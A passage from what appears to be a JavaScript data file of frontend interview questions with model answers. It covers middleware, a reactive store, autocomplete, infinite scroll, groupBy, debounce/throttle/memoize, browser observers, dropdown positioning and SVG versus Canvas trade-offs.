const pipe = (...fns) => (x) => fns.reduce((acc, fn) => fn(acc), x)

// Usage
const double = x => x * 2
const addOne = x => x + 1
const square = x => x * x

compose(square, addOne, double)(3)  // square(addOne(double(3))) = 49
pipe(double, addOne, square)(3)     // square(addOne(double(3))) = 49

// ─────────────────────────────────────────────────────────
// Koa-style async middleware (like TikTok/Express internals)
function applyMiddleware(middlewares) {
  return function(ctx) {
    function dispatch(i) {
      if (i >= middlewares.length) return Promise.resolve()
      const middleware = middlewares[i]
      return Promise.resolve(middleware(ctx, () => dispatch(i + 1)))
    }
    return dispatch(0)
  }
}

// Usage
const logger = async (ctx, next) => {
  console.log('before', ctx.url)
  await next()
  console.log('after', ctx.url)
}
const handler = async (ctx, next) => {
  ctx.body = 'Hello'
  await next()
}
const run = applyMiddleware([logger, handler])
run({ url: '/home' })`,
  },
  {
    id: 'store-data',
    companies: ['Airbnb'],
    title: 'Implement a reactive StoreData class',
    difficulty: 'medium',
    category: 'Performance',
    description: 'Implement a `StoreData` class with `addData(key, value)` and `listenToKey(key, callback)` methods. The callback fires whenever a specific key\'s value changes. This mirrors a simplified reactive store like Zustand or Redux.',
    answerType: 'code',
    tags: ['observer pattern', 'classes', 'reactivity'],
    source: 'frontendinterviewhandbook.com — Airbnb',
    answer: `class StoreData {
  constructor() {
    this._data = {}
    this._listeners = {}  // key → Set of callbacks
  }

  addData(key, value) {
    const oldValue = this._data[key]
    this._data[key] = value

    // Notify listeners only if value changed
    if (oldValue !== value && this._listeners[key]) {
      this._listeners[key].forEach(cb => cb(value, oldValue))
    }
  }

  listenToKey(key, callback) {
    if (!this._listeners[key]) this._listeners[key] = new Set()
    this._listeners[key].add(callback)

    // Return unsubscribe function
    return () => this._listeners[key].delete(callback)
  }

  getData(key) {
    return this._data[key]
  }
}

// Usage
const store = new StoreData()

const unsub = store.listenToKey('count', (newVal, oldVal) => {
  console.log(\`count changed: \${oldVal} → \${newVal}\`)
})

store.addData('count', 1)   // "count changed: undefined → 1"
store.addData('count', 2)   // "count changed: 1 → 2"
store.addData('count', 2)   // (no event — same value)
unsub()
store.addData('count', 3)   // (no event — unsubscribed)`,
  },

  // ── SYSTEM DESIGN ────────────────────────────────────────────
  {
    id: 'autocomplete',
    companies: ['Airbnb', 'Amazon', 'Google'],
    title: 'Design an autocomplete / type-ahead component',
    difficulty: 'hard',
    category: 'System Design',
    description: 'Design and implement an autocomplete input that fetches suggestions from an API as the user types. Handle debouncing, race conditions, keyboard navigation, and accessibility.',
    answerType: 'code',
    tags: ['debounce', 'async', 'race conditions', 'a11y', 'UX'],
    source: 'frontendinterviewhandbook.com — Airbnb',
    answer: `class Autocomplete {
  constructor(inputEl, fetchFn, options = {}) {
    this.input = inputEl
    this.fetch = fetchFn
    this.delay = options.delay ?? 300
    this.minChars = options.minChars ?? 2

    this.listEl = this._createList()
    this.timer = null
    this.activeRequest = null
    this.activeIndex = -1

    this.input.addEventListener('input',   e => this._onInput(e))
    this.input.addEventListener('keydown', e => this._onKeydown(e))
    this.input.setAttribute('autocomplete', 'off')
    this.input.setAttribute('aria-autocomplete', 'list')
    this.input.setAttribute('role', 'combobox')
  }

  _onInput({ target: { value } }) {
    clearTimeout(this.timer)
    if (value.length < this.minChars) return this._hide()

    this.timer = setTimeout(async () => {
      // Cancel any pending request (race condition fix)
      const requestId = Symbol()
      this.activeRequest = requestId

      const results = await this.fetch(value)

      if (this.activeRequest !== requestId) return  // stale

      this._render(results)
    }, this.delay)
  }

  _onKeydown(e) {
    const items = this.listEl.querySelectorAll('[role="option"]')
    if (e.key === 'ArrowDown') {
      e.preventDefault()
      this.activeIndex = Math.min(this.activeIndex + 1, items.length - 1)
    } else if (e.key === 'ArrowUp') {
      e.preventDefault()
      this.activeIndex = Math.max(this.activeIndex - 1, -1)
    } else if (e.key === 'Enter' && this.activeIndex >= 0) {
      items[this.activeIndex]?.click()
    } else if (e.key === 'Escape') {
      this._hide()
    }
    items.forEach((item, i) =>
      item.setAttribute('aria-selected', String(i === this.activeIndex))
    )
  }

  _render(items) {
    this.listEl.innerHTML = ''
    this.activeIndex = -1
    items.forEach(text => {
      const li = document.createElement('li')
      li.textContent = text
      li.setAttribute('role', 'option')
      li.addEventListener('click', () => {
        this.input.value = text
        this._hide()
      })
      this.listEl.appendChild(li)
    })
    this.listEl.hidden = items.length === 0
  }

  _hide() { this.listEl.hidden = true }

  _createList() {
    const ul = document.createElement('ul')
    ul.setAttribute('role', 'listbox')
    ul.hidden = true
    this.input.parentNode.appendChild(ul)
    return ul
  }
}

// Usage
const inputEl = document.querySelector('#search')
const fetchFn = async (q) => {
  const r = await fetch('/api/suggest?q=' + encodeURIComponent(q))
  return r.json()
}
new Autocomplete(inputEl, fetchFn, { delay: 250, minChars: 2 })`,
  },
  {
    id: 'infinite-scroll',
    companies: ['Amazon', 'Netflix', 'Meta'],
    title: 'Implement infinite scroll with IntersectionObserver',
    difficulty: 'medium',
    category: 'System Design',
    description: 'Implement an infinite-scrolling list that fetches the next page of data when the user reaches the bottom of the list, using IntersectionObserver instead of scroll events.',
    answerType: 'code',
    tags: ['IntersectionObserver', 'pagination', 'performance', 'async'],
    answer: `class InfiniteScroll {
  constructor(container, fetchPage) {
    this.container = container
    this.fetchPage = fetchPage
    this.page = 1
    this.loading = false
    this.done = false

    // Sentinel element sits at the bottom of the list
    this.sentinel = document.createElement('div')
    container.appendChild(this.sentinel)

    this.observer = new IntersectionObserver(
      ([entry]) => { if (entry.isIntersecting) this._load() },
      { rootMargin: '200px 0px' }  // pre-fetch 200px before visible
    )
    this.observer.observe(this.sentinel)
  }

  async _load() {
    if (this.loading || this.done) return
    this.loading = true
    this._showSpinner()

    const items = await this.fetchPage(this.page)

    if (!items.length) {
      this.done = true
      this.observer.disconnect()
    } else {
      items.forEach(item => {
        const el = document.createElement('div')
        el.className = 'item'
        el.textContent = item.title
        this.container.insertBefore(el, this.sentinel)
      })
      this.page++
    }

    this._hideSpinner()
    this.loading = false
  }

  _showSpinner() { this.sentinel.textContent = 'Loading…' }
  _hideSpinner() { this.sentinel.textContent = '' }
}

// Usage
const container = document.querySelector('#feed')
const fetchPage = async (page) => {
  const r = await fetch('/api/feed?page=' + page)
  return r.json()
}
const infiniteList = new InfiniteScroll(container, fetchPage)
void infiniteList`,
  },
  {
    id: 'group-by-dictionary',
    companies: ['DriveNets'],
    title: 'Implement Dictionary `groupBy` utility',
    difficulty: 'medium',
    category: 'Algorithms',
    description: 'Given an array and a key selector, group items into a dictionary where each key maps to all matching items. Handle both function selectors and property-name selectors.',
    answerType: 'code',
    tags: ['groupBy', 'Map', 'array utilities'],
    source: 'Glassdoor — DriveNets Front End Developer: https://www.glassdoor.com/Interview/DriveNets-Front-End-Developer-Interview-Questions-EI_IE2183997.0,9_KO10,29.htm',
    answer: `// Interview explanation:
// groupBy is O(n): scan once and bucket each item by computed key.
// Main edge cases interviewers expect:
// - selector is either a function or a property name
// - undefined/null keys are still grouped deterministically
// - stable order inside each group follows input order

function groupBy(items, selector) {
  const getKey =
    typeof selector === 'function'
      ? selector
      : (item) => item?.[selector]

  return items.reduce((acc, item) => {
    const key = String(getKey(item))
    if (!acc[key]) acc[key] = []
    acc[key].push(item)
    return acc
  }, {})
}

// Usage
const users = [
  { id: 1, team: 'A' },
  { id: 2, team: 'B' },
  { id: 3, team: 'A' },
]

groupBy(users, 'team')
// { A: [{id:1, team:'A'}, {id:3, team:'A'}], B: [{id:2, team:'B'}] }

groupBy(users, (u) => u.id % 2 === 0 ? 'even' : 'odd')
// { odd: [{id:1...}, {id:3...}], even: [{id:2...}] }

// Follow-up discussion:
// - Use Map instead of object when keys are not strings.
// - For large datasets, avoid JSON stringify key generation.
//
// Common interviewer follow-ups:
// Q: Complexity?
// A: Time is O(n) and extra space is O(n) in the worst case.
// Q: How to preserve insertion order of groups?
// A: Use Map for buckets; it preserves insertion order and supports non-string keys.
// Q: How to handle multi-key grouping?
// A: Apply nested grouping (group by key A, then group each bucket by key B).`,
  },
  {
    id: 'debounce-throttle-memoize-explain',
    companies: ['DriveNets'],
    title: 'Explain debounce vs throttle vs memoize',
    difficulty: 'medium',
    category: 'Performance',
    description: 'Interviewers ask when to use debounce, throttle, and memoization, and how they differ in behavior. Explain each with practical frontend examples.',
    answerType: 'mixed',
    tags: ['debounce', 'throttle', 'memoize', 'performance'],
    source: 'Glassdoor — DriveNets Front End Developer: https://www.glassdoor.com/Interview/DriveNets-Front-End-Developer-Interview-Questions-EI_IE2183997.0,9_KO10,29.htm',
    answer: `// Debounce: run after user stops triggering events for delay ms.
// Best for: search input, autosave, expensive validation.
// Behavior: many rapid calls -> one final call.

// Throttle: run at most once per interval.
// Best for: scroll, resize, drag pointer updates.
// Behavior: many rapid calls -> periodic calls.

// Memoize: cache function outputs for identical inputs.
// Best for: pure expensive computations.
// Behavior: repeated same args -> instant cached result.

// Interview framing:
// - Debounce controls "when" execution happens (after quiet time).
// - Throttle controls "how often" execution can happen.
// - Memoize controls "whether recomputation is needed".

// Usage examples:
const onSearch = debounce((q) => api.search(q), 300)
input.addEventListener('input', (e) => onSearch(e.target.value))

const onScroll = throttle(() => updateVisibleRows(), 100)
window.addEventListener('scroll', onScroll)

const fib = memoize((n) => (n < 2 ? n : fib(n - 1) + fib(n - 2)))
fib(40) // first call expensive
fib(40) // cached
//
// Common interviewer follow-ups:
// Q: Leading/trailing behavior for debounce/throttle?
// A: Debounce is usually trailing by default; throttle is often leading with optional trailing.
// Q: How to cancel pending debounce/throttle calls?
// A: Expose cancel() to clear timers and optionally flush() to run pending work immediately.
// Q: Memoization pitfalls?
// A: Non-serializable args break naive keying, and unbounded caches can leak memory.`,
  },
  {
    id: 'observers-for-dynamic-ui',
    companies: ['DriveNets'],
    title: 'When to use IntersectionObserver, ResizeObserver, and MutationObserver',
    difficulty: 'medium',
    category: 'DOM & Browser',
    description: 'Explain which browser observer to use for infinite-scroll detection, element size/position changes, and DOM structure changes. Provide a practical composition pattern for real UIs.',
    answerType: 'mixed',
    tags: ['IntersectionObserver', 'ResizeObserver', 'MutationObserver', 'UI architecture'],
    source: 'Glassdoor — DriveNets Front End Developer: https://www.glassdoor.com/Interview/DriveNets-Front-End-Developer-Interview-Questions-EI_IE2183997.0,9_KO10,29.htm',
    answer: `// Interview explanation:
// Choose observer by signal type:
// - visibility signal -> IntersectionObserver
// - size signal -> ResizeObserver
// - DOM structure/content signal -> MutationObserver
// Combining them gives robust UI updates without heavy polling.

// Observer choice:
// 1) IntersectionObserver: visibility in viewport/root (e.g. infinite scroll sentinel)
// 2) ResizeObserver: element size changes (e.g. popover width/height changes)
// 3) MutationObserver: DOM tree/content changes (e.g. async content inserted)

function wireDynamicList(listEl, sentinelEl, onLoadMore) {
  const io = new IntersectionObserver(([entry]) => {
    if (entry.isIntersecting) onLoadMore()
  }, { rootMargin: '200px 0px' })

  const ro = new ResizeObserver(() => {
    // recalc layout-dependent positions, sticky offsets, etc.
    requestAnimationFrame(() => {
      // measure and update layout here
    })
  })

  const mo = new MutationObserver(() => {
    // content changed -> potentially re-measure / re-attach behaviors
    requestAnimationFrame(() => {
      // sync derived UI state
    })
  })

  io.observe(sentinelEl)
  ro.observe(listEl)
  mo.observe(listEl, { childList: true, subtree: true })

  return () => {
    io.disconnect()
    ro.disconnect()
    mo.disconnect()
  }
}

// Usage:
const cleanup = wireDynamicList(
  document.querySelector('#list'),
  document.querySelector('#sentinel'),
  () => fetchNextPage()
)
// later: cleanup()

// Follow-up discussion:
// - Batch DOM reads/writes via requestAnimationFrame.
// - Disconnect observers on unmount to avoid leaks.
//
// Common interviewer follow-ups:
// Q: Why not polling or scroll events?
// A: Polling wastes CPU, and scroll handlers are noisy; observers are browser-optimized and event-driven.
// Q: Which observer can trigger too often?
// A: ResizeObserver and MutationObserver; debounce expensive work and batch with rAF.
// Q: How to prevent feedback loops?
// A: Avoid mutating observed nodes directly in callbacks without guards; batch and short-circuit updates.`,
  },
  {
    id: 'dropdown-positioning-and-portals',
    companies: ['DriveNets'],
    title: 'Design robust dropdown positioning (top/bottom) with portals',
    difficulty: 'hard',
    category: 'System Design',
    description: 'Design a dropdown/popover that chooses top or bottom placement based on available viewport space, avoids clipping, and renders in a portal when parent overflow would hide it.',
    answerType: 'mixed',
    tags: ['dropdown', 'portals', 'positioning', 'UX'],
    source: 'Glassdoor — DriveNets Front End Developer: https://www.glassdoor.com/Interview/DriveNets-Front-End-Developer-Interview-Questions-EI_IE2183997.0,9_KO10,29.htm',
    answer: `// Interview explanation:
// A dropdown must avoid clipping and choose placement by available space.
// Portals solve clipping from parent overflow/stacking contexts.
// Recompute placement whenever geometry can change.

function computePlacement(anchorRect, menuHeight, viewportHeight, gap = 8) {
  const spaceBelow = viewportHeight - anchorRect.bottom
  const spaceAbove = anchorRect.top

  if (spaceBelow >= menuHeight + gap) return 'bottom'
  if (spaceAbove >= menuHeight + gap) return 'top'
  return spaceBelow >= spaceAbove ? 'bottom' : 'top' // fallback
}

// Typical approach:
// 1) Measure anchor/menu with getBoundingClientRect
// 2) Compute placement using available space
// 3) Render menu in a portal (e.g. document.body) to escape overflow clipping
// 4) Recompute on resize/scroll/content changes (ResizeObserver + listeners)
// 5) Keep a11y: role="listbox"/"menu", keyboard nav, focus trap when needed

// Usage:
const anchorRect = button.getBoundingClientRect()
const menuHeight = menu.offsetHeight
const placement = computePlacement(anchorRect, menuHeight, window.innerHeight)
menu.dataset.placement = placement // "top" | "bottom"
//
// Common interviewer follow-ups:
// Q: Complexity?
// A: Placement computation is O(1) per recompute.
// Q: Handling nested scroll containers?
// A: Recompute on the nearest scroll parents, not only window scroll.
// Q: Avoiding layout thrash?
// A: Batch all reads first, then writes in requestAnimationFrame.`,
  },
  {
    id: 'svg-vs-canvas-tradeoffs',
    companies: ['DriveNets'],
    title: 'SVG vs Canvas for large-scale rendering',
    difficulty: 'medium',
    category: 'Performance',
    description: 'Compare SVG and Canvas for rendering many visual elements in UI-heavy apps. Explain when Canvas is preferred and what trade-offs exist for interactivity and accessibility.',
    answerType: 'text',
    tags: ['SVG', 'Canvas', 'rendering', 'performance'],
    source: 'Glassdoor — DriveNets Front End Developer: https://www.glassdoor.com/Interview/DriveNets-Front-End-Developer-Interview-Questions-EI_IE2183997.0,9_KO10,29.htm',
    answer: `Interview explanation:
- This is a trade-off question, not a one-word answer.
- Interviewers look for a decision framework: element count, redraw frequency, interaction model, and accessibility needs.

- SVG is DOM-based and ideal for a smaller number of highly interactive, accessible vector elements.
- Canvas is immediate-mode pixel rendering and often performs better for very large numbers of objects.
- SVG pros: CSS styling, built-in DOM events per element, easier accessibility semantics.
- SVG cons: thousands of nodes can become expensive (layout/paint/memory).
- Canvas pros: efficient bulk drawing, lower DOM overhead for dense scenes.
- Canvas cons: manual hit-testing, more custom code for interactions and accessibility.
- Rule of thumb: choose SVG for rich per-element interaction; choose Canvas for massive datasets or frequent redraw-heavy visualizations.

Usage examples:
- Use SVG for a workflow editor with selectable nodes/edges and keyboard focus.
- Use Canvas for a heatmap/chart with 50k+ points and frequent redraws.
- Use hybrid: canvas for heavy rendering + SVG/HTML overlay for tooltips/selection.

Common interviewer follow-ups:
- Q: Hybrid strategy?
- A: Render dense primitives on canvas and layer SVG/HTML for hit targets and tooltips.
- Q: Accessibility plan for canvas-heavy UIs?
- A: Provide semantic mirrors, keyboard navigation paths, and ARIA announcements.
- Q: How to validate the choice?
- A: Profile FPS, frame time, memory, and input latency with realistic datasets.`,
  },
]
